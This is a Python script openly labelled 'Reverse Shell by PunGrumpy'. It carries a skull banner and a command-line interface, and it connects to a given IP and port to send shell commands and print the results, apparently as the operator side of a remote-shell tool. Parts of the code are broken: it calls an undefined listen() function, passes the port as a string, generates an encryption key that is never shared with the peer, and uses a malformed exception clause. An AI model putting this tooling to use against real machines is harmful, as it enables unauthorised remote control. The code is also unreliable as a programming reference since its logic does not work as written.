import os
import time
import socket
import colorama
import subprocess
from docopt import docopt
from colorama import Fore, Style
from cryptography.fernet import Fernet

colorama.init(autoreset=True)

USAGE = Fore.GREEN + """
Reverse Shell

Usage:
  reverse_shell.py [--ip=<ip>] [--port=<port>] [--encrypt]
  reverse_shell.py [-h | --help]

Options:
  --ip=<ip>      IP address to connect
  --port=<port>  Port number to connect
  --encrypt      Enable encryption for communication
  -h, --help     Show this help message and exit
""" + Style.RESET_ALL

OK = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
ERR = f"{Fore.RED}[-]{Style.RESET_ALL}"
INF = f"{Fore.YELLOW}[*]{Style.RESET_ALL}"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(Fore.LIGHTRED_EX + """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⡛⠻⠿⢶⣶⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⠅⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⣱⠆⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣰⣿⣿⣿⣿⢃⡄⠀⠀⠀⢻⣧⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⡿⠿⣻⠿⠛⠛⠙⠛⣿⣿⣇⣼⠀⣀⣠⣤⠚⠛⠛⠻⠿⣿⠿⢷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⡿⠟⠉⢀⡴⠊⠀⠀⠀⠀⡰⠊⠁⠀⠈⠙⣟⠉⠀⠀⠙⢦⠀⠀⠀⠀⠙⠦⣄⠉⠛⢿⣦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣾⡿⠋⠀⢀⡴⠁⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠑⣄⠀⠀⠀⠀⠈⠳⣄⠀⠙⠻⣷⡄⠀⠀⠀⠀
⠀⠀⠀⣰⣿⠋⠀⠀⣠⠋⠀⠀⠀⣠⡴⠶⢿⣦⡀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣠⡾⠷⠦⣄⠀⠀⠀⠘⢧⡀⠀⠙⢿⣦⠀⠀⠀
⠀⠀⣰⡿⠁⠀⠀⡴⠁⠀⠀⣠⠞⠁⠀⣠⠞⠉⠹⡆⠀⠀⠀⠀⡇⠀⠀⠀⢀⡟⠛⠦⣀⠀⠀⠙⢦⠀⠀⠈⢳⡀⠀⠈⢻⣧⠀⠀
⠀⢰⣿⠁⠀⠀⣸⠁⠀⠀⢠⡏⠀⠀⣼⠃⠀⠀⢰⡏⠀⠀⠀⢰⡇⠀⠀⠀⠸⣇⠀⠀⠈⢣⠀⠀⠸⡇⠀⠀⠀⢳⠀⠀⠈⢿⣇⠀
⠀⣿⡇⠀⠀⢠⡇⠀⠀⠀⠈⣇⠀⢠⡇⠀⠀⢀⡾⠁⠀⠀⣠⡞⠻⣦⠀⠀⠀⠹⣆⠀⠀⠀⡇⠀⢠⡇⠀⠀⠀⠈⣇⠀⠀⠘⣿⡄
⢠⣿⠀⠀⠀⣼⠀⠀⠀⠀⠀⠉⠓⣤⣷⣤⠶⠋⠀⠀⠀⣰⡟⠀⠀⠸⣧⡀⠀⠀⠈⠳⠤⣤⣧⠴⠊⠀⠀⠀⠀⠀⢹⠀⠀⠀⢻⡇
⢸⡟⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⢰⡿⣧⣤⣤⣤⠿⣷⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⢸⡇
⢸⡇⠀⠀⠀⡇⠀⠀⠀⠀⢶⣦⣸⣇⠀⠀⠀⠀⠀⠀⠈⠛⠚⠻⡟⠛⠛⠉⠀⠀⠀⠀⠀⠀⢸⣇⣤⣶⠂⠀⠀⠀⢸⡇⠀⠀⢸⡇
⢸⣿⠀⠀⠀⣷⠀⠀⠀⠀⠈⢿⡉⠛⠲⣦⡀⠀⠀⠀⠀⠀⠀⢀⣇⠀⣀⣀⣀⣀⣤⣤⢴⡶⠋⠉⢨⠇⠀⠀⠀⠀⢸⠃⠀⠀⢸⡇
⠈⣿⡄⠀⠀⢻⡀⠀⠀⠀⠀⠈⢳⡀⠀⢹⡇⠀⠀⠀⢰⣿⠛⠛⠉⠉⠉⣉⡭⠞⢧⣠⠞⠁⠀⡰⠋⠀⠀⠀⠀⠀⢸⠀⠀⠀⣿⡇
⠀⢿⣧⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⢳⣄⠀⠛⠲⠶⣶⣞⠁⠀⠀⠀⠀⣾⡅⢀⣠⡴⠿⣄⢀⣾⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⢰⣿⠀
⠀⠘⣿⣆⠀⠀⠸⡄⠀⠀⠀⠀⠀⠸⡏⠑⢤⡀⠀⠀⠈⠉⠛⠲⠶⠚⠋⣿⠋⠁⠀⠀⠘⠋⡏⠀⠀⠀⠀⠀⠀⡼⠁⠀⢠⣿⠇⠀
⠀⠀⠘⢿⣦⠀⠀⠹⡄⠀⠀⠀⠀⠀⢿⡀⠀⠉⠓⠦⢤⣄⣀⣀⣀⣀⣀⡽⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⢀⡾⠁⠀⣠⣿⠏⠀⠀
⠀⠀⠀⠈⠻⣷⡄⠀⠈⢆⠀⠀⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⣠⠟⠁⢀⣴⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣷⣄⡈⠳⣄⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⢀⠴⠃⣀⣴⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣶⣤⣝⣦⣀⡀⠀⠱⡄⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⢀⡴⠃⠀⢀⣤⣞⣥⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣷⣶⣾⣦⣄⣀⣀⣠⣿⣀⣀⣤⣤⣾⣤⣶⣾⠿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            Reverse Shell by PunGrumpy⠀⠀⠀
    """ + Style.RESET_ALL)


def counting_time(retries, delay, message=""):
    for retry in range(retries, 0, -1):
        retry_message = f"{message} Retrying in {retry} seconds..."
        print(retry_message, end='\r')
        time.sleep(delay + 0.1)
    print(" " * len(retry_message), end='\r')


def user_interface():
    clear()
    banner()

    try:
        print(f"{INF} Enter IP address to connect to: ", end="")
        ip = input()
        if not ip:
            counting_time(3, 1, message=f'{ERR} IP address cannot be empty,')
            user_interface()
        print(f"{INF} Enter port number to connect to: ", end="")
        port = input()
        if not port:
            counting_time(3, 1, message=f'{ERR} Port number cannot be empty,')
            user_interface()
        print(f"{INF} Do you want to enable encryption? [y/N]: ", end="")
        encrypt = input()
        if encrypt.lower() == "y":
            print(f"{OK} Encryption enabled\n")
        else:
            print(f"{OK} Encryption disabled\n")

        while True:
            s = connect(ip, port)
            if s:
                listen(s)
                print(f"{OK} Connected to {ip}:{port}")
            else:
                counting_time(5, 1, message=f'{ERR} Connection failed,')
    except KeyboardInterrupt or Exception:
        print(f"\n{OK} Exiting...")
        time.sleep(1)
        exit(0)


def generate_key():
    global encrypt_key
    encrypt_key = Fernet.generate_key()


def encrypt_message(message):
    fernet = Fernet(encrypt_key)
    encrypted_message = fernet.encrypt(message.encode())
    return encrypted_message


def decrypt_message(encrypted_message):
    fernet = Fernet(encrypt_key)
    decrypted_message = fernet.decrypt(encrypted_message).decode()
    return decrypted_message


def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    while True:
        try:
            s.connect((ip, port))
            break
        except (socket.error, socket.timeout):
            print(f"{ERR} Connection failed. Retrying...")
            time.sleep(5)

    return s


def main():
    args = docopt(USAGE)

    ip, port = args['--ip'], args['--port']
    encrypt = args['--encrypt']

    if encrypt:
        generate_key()

    try:
        s = connect(ip, port)
        print(f"{OK} Connected to {ip}:{port}\n")
        print(f"{INF} Type 'exit' to terminate the shell.\n")

        while True:
            command = input("$ ").strip()

            if encrypt:
                encrypted_command = encrypt_message(command)
                s.send(encrypted_command)
            else:
                s.send(command.encode())

            if command.lower() == "exit":
                break

            try:
                result = s.recv(4096)
                if encrypt:
                    decrypted_result = decrypt_message(result)
                    print(decrypted_result)
                else:
                    print(result.decode())
            except (socket.error, socket.timeout):
                print(f"{ERR} Connection lost. Trying to reconnect...")
                s = connect(ip, port)

        s.close()

    except KeyboardInterrupt:
        print(f"\n{OK} Keyboard interrupt. Exiting...")
        exit(0)

    except Exception as e:
        print(f"{ERR} An error occurred: {str(e)}")
        exit(1)


if __name__ == '__main__':
    main()
